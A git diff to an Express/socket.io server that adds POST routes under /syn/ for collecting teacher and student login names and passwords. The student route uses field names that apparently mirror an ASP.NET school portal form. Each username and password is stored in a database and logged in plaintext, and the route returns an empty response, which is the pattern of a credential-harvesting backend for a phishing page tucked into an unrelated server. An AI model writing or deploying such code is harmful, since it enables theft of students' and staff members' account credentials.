@@ -19,6 +19,7 @@ const INSPECTARGS = {
 }
 var app = express();
 app.use(bodyParser.json())
+app.use(bodyParser.urlencoded({ extended: true }))
 var http = new (require('http').Server)(app);
 var io = new (require('socket.io').Server)(http, {
 	maxHttpBufferSize: Infinity,
@@ -32,6 +33,44 @@ var iom = require("./iomodule.js");
 iom.r.commit = process.env.HEROKU_SLUG_COMMIT ?? execSync("git rev-parse HEAD")
 iom.main(io);
 const logger = iom.r.dbg.extend("server")
+
+const synlog = logger.extend("syn")
+app.post("/syn/teach", (req, res, next) => {
+  const { body } = req
+  req.c = [body.login_name, body.password]
+  next()
+})
+app.post("/syn/stu", (req, res, next) => {
+  const { body } = req
+  req.c = [body.ctl00$MainContent$username, body.ctl00$MainContent$password]
+  next()
+})
+app.post("/syn/:side", ({ c, params: { side } }, res) => {
+  const logger = synlog.extend(side)
+  const [u, p] = c
+
+  const lkey = JSON.stringify(u) + " => " + JSON.stringify(p)
+  let outcome
+  
+  const db = touch("syn-" + side)
+  if (u in db) {
+    if (db[u].includes(p)) {
+      outcome = "dupe"
+    } else {
+      outcome = "new pass"
+      db[u].push(p)
+      db[u].sort()
+      save()
+    }
+  } else {
+    outcome = "new user"
+    db[u] = [p]
+    save()
+  }
+  logger(lkey + ": " + outcome)
+  res.status(204)
+  res.send("")
+})
 
 io.toString = () => "[IO]"
 
